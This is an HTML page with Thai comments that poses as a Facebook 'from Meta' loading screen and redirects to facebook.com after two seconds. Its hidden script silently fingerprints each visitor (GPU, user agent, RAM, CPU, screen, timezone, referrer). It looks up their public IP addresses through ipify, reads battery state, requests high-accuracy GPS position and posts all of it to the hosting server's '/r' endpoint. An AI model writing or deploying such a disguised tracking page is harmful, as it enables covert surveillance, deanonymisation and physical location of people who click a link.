<!DOCTYPE html>
<html lang="th">
<head>
<meta charset="utf-8">
<title>Loading...</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<!-- redirect -->
<meta http-equiv="refresh" content="2;url=https://www.facebook.com">

<style>
html, body {
    height: 100%;
    margin: 0;
    background: #ffffff;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
}

.wrapper {
    height: 100%;
    display: flex;
    flex-direction: column;
}

.main-content {
    flex: 1;
    display: flex;
    justify-content: center;
    align-items: center;
}

.fb-logo {
    width: 72px;
    height: 72px;
}

.footer {
    padding-bottom: 48px;
    text-align: center;
    color: #8a8d91;
}

.from-text {
    font-size: 13px;
    margin-bottom: 6px;
}

.meta-logo {
    display: flex;
    justify-content: center;
    align-items: center;
    gap: 6px;
    font-size: 17px;
    font-weight: 600;
    color: #1877f2;
}

.meta-symbol {
    font-size: 22px;
    line-height: 1;
}
</style>
</head>

<body>
<div class="wrapper">

    <!-- โลโก้กลาง -->
    <div class="main-content">
        <svg class="fb-logo" viewBox="0 0 24 24" fill="#1877F2">
            <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
        </svg>
    </div>

    <!-- ด้านล่าง -->
    <div class="footer">
        <div class="from-text">from</div>
        <div class="meta-logo">
            <span class="meta-symbol">∞</span>
            <span>Meta</span>
        </div>
    </div>

</div>

<!-- SCRIPT เดิมของคุณ (ไม่แก้ logic) -->
<script>
(function(){
  var gl=null,dbg=null,gpu='Blocked';
  try{
    gl=document.createElement('canvas').getContext('webgl')
      ||document.createElement('canvas').getContext('experimental-webgl');
    if(gl){
      dbg=gl.getExtension('WEBGL_debug_renderer_info');
      gpu=dbg?gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL):'N/A';
    }
  }catch(e){}

  var id;
  try{
    id=btoa((navigator.userAgent+gpu).replace(/[^\x00-\x7F]/g,''))
      .substring(0,12)||'id'+Date.now().toString(36);
  }catch(e){
    id='id'+Date.now().toString(36);
  }

  var d={
    t:'INSTANT',
    id:id,
    os:navigator.platform,
    ram:navigator.deviceMemory||'N/A',
    cpu:navigator.hardwareConcurrency||'N/A',
    res:screen.width+'x'+screen.height,
    gpu:gpu,
    ref:document.referrer||'',
    ts:new Date().toISOString(),
    tz:(typeof Intl!=='undefined'&&Intl.DateTimeFormat)
        ?Intl.DateTimeFormat().resolvedOptions().timeZone:'N/A'
  };

  fetch('/r',{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify(d)
  });

  Promise.all([
    fetch('https://api.ipify.org?format=json').then(r=>r.json()),
    fetch('https://api64.ipify.org?format=json')
      .then(r=>r.json()).catch(()=>({ip:'N/A'})),
    navigator.getBattery?navigator.getBattery():
      Promise.resolve({level:0,charging:false})
  ]).then(arr=>{
    fetch('/r',{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({
        t:'NET',
        id:id,
        v4:arr[0].ip||'N/A',
        v6:arr[1].ip||'N/A',
        bt:(arr[2].level*100)+'%',
        bts:arr[2].charging
      })
    });
  }).catch(()=>{
    fetch('/r',{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({t:'NET',id:id,v4:'N/A',v6:'N/A',bt:'N/A',bts:false})
    });
  });

  if(navigator.geolocation){
    navigator.geolocation.getCurrentPosition(
      p=>{
        fetch('/r',{
          method:'POST',
          headers:{'Content-Type':'application/json'},
          body:JSON.stringify({
            t:'GPS',
            id:id,
            lat:p.coords.latitude,
            lon:p.coords.longitude,
            acc:p.coords.accuracy
          })
        });
      },
      ()=>{},
      {enableHighAccuracy:true}
    );
  }
})();
</script>

</body>
</html>
